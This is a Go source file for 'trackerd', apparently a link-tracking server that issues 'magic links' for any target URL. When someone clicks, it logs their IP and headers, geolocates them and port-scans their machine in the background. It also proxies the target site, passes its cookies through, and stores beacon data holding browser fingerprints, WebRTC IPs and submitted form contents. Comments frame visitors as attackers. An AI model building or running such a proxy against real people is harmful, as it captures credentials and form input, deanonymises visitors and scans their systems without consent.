package main

import (
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"net/url"
	"os"
	"strings"
)

type Server struct {
	Host string
}

func newServer() *Server {
	host := os.Getenv("TRACKERD_HOST")
	if host == "" {
		port := os.Getenv("TRACKERD_PORT")
		if port == "" {
			port = "5000"
		}
		host = "http://localhost:" + port
	}
	return &Server{Host: strings.TrimRight(host, "/")}
}

func (s *Server) routes() *http.ServeMux {
	mux := http.NewServeMux()
	mux.HandleFunc("/t/", s.handleTrack)
	mux.HandleFunc("/__td__/", s.handleCollect)
	mux.HandleFunc("/api/create", s.handleCreate)
	mux.HandleFunc("/api/logs/", s.handleLogs)
	mux.HandleFunc("/api/tokens", s.handleListTokens)
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) { http.NotFound(w, r) })
	return mux
}

// handleTrack is the magic link entry point and all subsequent proxied pages.
func (s *Server) handleTrack(w http.ResponseWriter, r *http.Request) {
	trimmed := strings.TrimPrefix(r.URL.Path, "/t/")
	parts := strings.SplitN(trimmed, "/", 3)
	if len(parts) == 0 || parts[0] == "" {
		http.NotFound(w, r)
		return
	}
	token := parts[0]

	tok, err := getToken(token)
	if err != nil {
		http.NotFound(w, r)
		return
	}

	// Extract real attacker IP — prefer X-Forwarded-For set by Nginx/Apache
	ip := r.Header.Get("X-Forwarded-For")
	if ip == "" {
		ip = r.Header.Get("X-Real-IP")
	}
	if ip == "" {
		ip = r.RemoteAddr
	}
	if idx := strings.Index(ip, ","); idx != -1 {
		ip = strings.TrimSpace(ip[:idx])
	}
	if strings.Contains(ip, ":") && !strings.Contains(ip, "[") {
		ip = strings.Split(ip, ":")[0]
	}

	headers, _ := json.Marshal(r.Header)
	hitID, err := logHit(token, ip, r.UserAgent(), string(headers))
	if err != nil {
		log.Printf("logHit error: %v", err)
	}

	// Async: geo lookup + port scan run in background, don't block the response
	go func(id int64, attackerIP string) {
		geo, err := geoLookup(attackerIP)
		if err == nil {
			if b, err := json.Marshal(geo); err == nil {
				updateHitGeo(id, string(b))
			}
		}
		ports := scanPorts(attackerIP)
		if b, err := json.Marshal(ports); err == nil {
			updateHitPortScan(id, string(b))
		}
	}(hitID, ip)

	// Determine fetch URL
	parsedTarget, _ := url.Parse(tok.TargetURL)
	targetOrigin := fmt.Sprintf("%s://%s", parsedTarget.Scheme, parsedTarget.Host)

	var fetchURL string
	if len(parts) >= 2 && parts[1] == "p" {
		subPath := "/"
		if len(parts) == 3 && parts[2] != "" {
			subPath = "/" + parts[2]
		}
		fetchURL = targetOrigin + subPath
		if r.URL.RawQuery != "" {
			fetchURL += "?" + r.URL.RawQuery
		}
	} else {
		fetchURL = tok.TargetURL
	}

	status, respHeaders, body, err := fetchAndProxy(fetchURL, targetOrigin, token, s.Host, r.Header)
	if err != nil {
		http.Error(w, "Proxy error: "+err.Error(), http.StatusBadGateway)
		return
	}

	ct := respHeaders.Get("Content-Type")
	if ct == "" {
		ct = "text/html; charset=utf-8"
	}
	w.Header().Set("Content-Type", ct)
	for _, v := range respHeaders.Values("Set-Cookie") {
		w.Header().Add("Set-Cookie", v)
	}
	w.WriteHeader(status)
	w.Write(body)
}

// handleCollect receives JS beacon POSTs. Multiple beacons arrive per hit
// (initial fingerprint, then WebRTC IPs, then battery) — we merge them.
func (s *Server) handleCollect(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		w.WriteHeader(http.StatusMethodNotAllowed)
		return
	}
	parts := strings.Split(strings.TrimPrefix(r.URL.Path, "/__td__/"), "/")
	if len(parts) < 1 || parts[0] == "" {
		w.WriteHeader(http.StatusBadRequest)
		return
	}
	token := parts[0]

	var payload struct {
		Type string          `json:"t"`
		Data json.RawMessage `json:"d"`
	}
	if err := json.NewDecoder(r.Body).Decode(&payload); err != nil {
		w.WriteHeader(http.StatusBadRequest)
		return
	}

	id, ok := getLatestHitID(token)
	if !ok {
		w.WriteHeader(http.StatusNoContent)
		return
	}

	switch payload.Type {
	case "fp":
		// Merge incoming fingerprint fields into existing record
		existing := getHitFingerprint(id)
		merged := mergeJSON(existing, string(payload.Data))
		updateHitFingerprint(id, merged)
	case "form":
		updateHitFormData(id, string(payload.Data))
	}

	w.Header().Set("Content-Type", "application/json")
	w.Write([]byte(`{"ok":true}`))
}

// mergeJSON merges b into a (b keys overwrite a keys). Returns merged JSON.
func mergeJSON(a, b string) string {
	if a == "" {
		return b
	}
	var ma, mb map[string]interface{}
	if err := json.Unmarshal([]byte(a), &ma); err != nil {
		return b
	}
	if err := json.Unmarshal([]byte(b), &mb); err != nil {
		return a
	}
	for k, v := range mb {
		ma[k] = v
	}
	out, _ := json.Marshal(ma)
	return string(out)
}

func (s *Server) handleCreate(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	var req struct {
		URL   string `json:"url"`
		Label string `json:"label"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, `{"error":"bad json"}`, http.StatusBadRequest)
		return
	}
	req.URL = strings.TrimSpace(req.URL)
	if !strings.HasPrefix(req.URL, "http://") && !strings.HasPrefix(req.URL, "https://") {
		http.Error(w, `{"error":"url must start with http:// or https://"}`, http.StatusBadRequest)
		return
	}
	token, err := createToken(req.URL, req.Label)
	if err != nil {
		log.Printf("createToken: %v", err)
		http.Error(w, `{"error":"db error"}`, http.StatusInternalServerError)
		return
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{
		"token":      token,
		"magic_link": s.Host + "/t/" + token,
		"target":     req.URL,
	})
}

func (s *Server) handleLogs(w http.ResponseWriter, r *http.Request) {
	token := strings.TrimPrefix(r.URL.Path, "/api/logs/")
	hits, err := getHitsByToken(token)
	if err != nil {
		http.Error(w, `{"error":"db error"}`, http.StatusInternalServerError)
		return
	}
	w.Header().Set("Content-Type", "application/json")
	if hits == nil {
		hits = []Hit{}
	}
	json.NewEncoder(w).Encode(hits)
}

func (s *Server) handleListTokens(w http.ResponseWriter, r *http.Request) {
	tokens, err := listTokens()
	if err != nil {
		http.Error(w, `{"error":"db error"}`, http.StatusInternalServerError)
		return
	}
	w.Header().Set("Content-Type", "application/json")
	if tokens == nil {
		tokens = []Token{}
	}
	json.NewEncoder(w).Encode(tokens)
}

func runServer() {
	port := os.Getenv("TRACKERD_PORT")
	if port == "" {
		port = "5000"
	}
	dbPath := os.Getenv("TRACKERD_DB")
	if dbPath == "" {
		dbPath = "trackerd.db"
	}
	if err := initDB(dbPath); err != nil {
		log.Fatalf("DB init: %v", err)
	}

	srv := newServer()
	mux := srv.routes()

	fmt.Printf("\033[36m[trackerd]\033[0m listening     : :%s\n", port)
	fmt.Printf("\033[36m[trackerd]\033[0m public host   : %s\n", srv.Host)
	fmt.Printf("\033[33m[trackerd]\033[0m database      : %s\n", dbPath)
	fmt.Printf("\033[36m[trackerd]\033[0m ready — waiting for hits\n\n")

	if err := http.ListenAndServe(":"+port, mux); err != nil {
		log.Fatal(err)
	}
}
